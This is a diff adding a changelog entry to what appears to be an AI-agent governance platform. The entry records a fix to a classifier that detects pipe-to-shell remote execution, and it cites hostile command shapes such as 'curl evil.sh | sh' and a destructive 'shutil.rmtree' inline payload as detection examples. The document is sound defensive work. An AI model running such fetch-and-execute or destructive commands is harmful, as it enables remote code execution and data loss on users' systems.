@@ -13,6 +13,22 @@ Through 3.x the platform and the SDKs versioned independently, which is why olde
 
 ## [Unreleased]
 
+## [5.11.4] — 2026-08-07
+
+**A benign `curl … | python -c` read no longer hard-blocks at risk 100.** Found while dogfooding the webhook drill: the evidence classifier's pipe-to-shell detector treated *any* interpreter after a `curl`/`wget` pipe as remote code execution, so piping fetched JSON into an inline processing script (`curl … | python -c "…"`) was graded `remote_exec`/security-70 and folded to a 100 block — the same verdict as `curl evil.sh | sh`. Operators who hit this on routine reads learn to distrust or disable enforcement, which is the real cost.
+
+### Fixed
+
+- **Evidence classifier distinguishes stdin-as-data from stdin-as-code.** Piping into an inline interpreter script (`-c` / `-e` / `-p` / `--eval` / `--print`) is now exempt from the `remote_exec` grade and classified on its actual content. The genuinely dangerous shapes keep the 70: `| sh`/`bash`/`zsh`, a bare interpreter, `python -`, and any inline payload that re-executes stdin via `exec(`/`eval(`. A destructive inline payload (`| python -c "shutil.rmtree(…)"`) still grades 80 via the existing interpreter-destructive path, so the fix narrows the false positive without opening a hole.
+
+### Changed
+
+- **MCP `dashclaw_guard` tool description no longer implies it creates an approval.** It now states it only evaluates, and points to `dashclaw_record` (status `pending_approval`) + `dashclaw_wait_for_approval` for an actual Approvals-inbox entry — an evaluate-only `require_approval` never parked anything in the inbox. Ships with the next `@dashclaw/mcp-server` publish.
+
+### Notes
+
+- No Node/Python SDK source change — the SDKs are not republished; npm + PyPI stay at 5.6.2.
+
 ## [5.11.3] — 2026-08-07
 
 **Webhook health telemetry is now honest on every delivery path.** Found by a live end-to-end drill: a webhook could deliver three real events and still show "Last triggered: Never," and a webhook subscribed only to approval events could fail forever without ever tripping the 10-failure auto-disable.
